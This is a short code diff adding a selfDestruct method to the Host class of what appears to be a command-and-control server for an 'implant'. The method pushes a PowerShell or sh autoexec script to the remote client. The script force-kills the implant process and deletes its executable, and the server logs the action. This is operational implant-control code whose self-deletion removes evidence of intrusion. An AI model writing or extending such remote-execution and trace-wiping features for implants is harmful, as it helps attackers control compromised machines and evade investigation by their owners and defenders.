@@ -241,6 +241,26 @@ class Host {
     return channelId;
   }
 
+  // Send an autoexec script that kills the implant process and removes its
+  // binary. The client exposes RSL_CLIENT_PID and RSL_CLIENT_EXE to autoexec
+  // scripts so the payload can target itself precisely.
+  selfDestruct() {
+    if (!this.alive) return false;
+    const isWindows = this.hello.os === "windows" || this.hello.os === "win";
+    const script = isWindows
+      ? 'Stop-Process -Id $env:RSL_CLIENT_PID -Force; Start-Sleep -Seconds 1; if ($env:RSL_CLIENT_EXE -and (Test-Path $env:RSL_CLIENT_EXE)) { Remove-Item -Path $env:RSL_CLIENT_EXE -Force -ErrorAction SilentlyContinue }'
+      : '#!/bin/sh\nkill -9 "$RSL_CLIENT_PID" 2>/dev/null\nsleep 1\nif [ -n "$RSL_CLIENT_EXE" ] && [ -f "$RSL_CLIENT_EXE" ]; then rm -f "$RSL_CLIENT_EXE"; fi\n';
+    this.send({
+      autoExec: {
+        os: this.hello.os || (isWindows ? "windows" : "linux"),
+        shell: isWindows ? "powershell" : "sh",
+        script: Buffer.from(script, "utf8"),
+      },
+    });
+    log.info("self-destruct sent", { hostId: this.id, label: this.label(), os: this.hello.os });
+    return true;
+  }
+
   onOpenOk(channelId, pid) {
     const pend = this._pending.get(channelId);
     if (!pend) return;
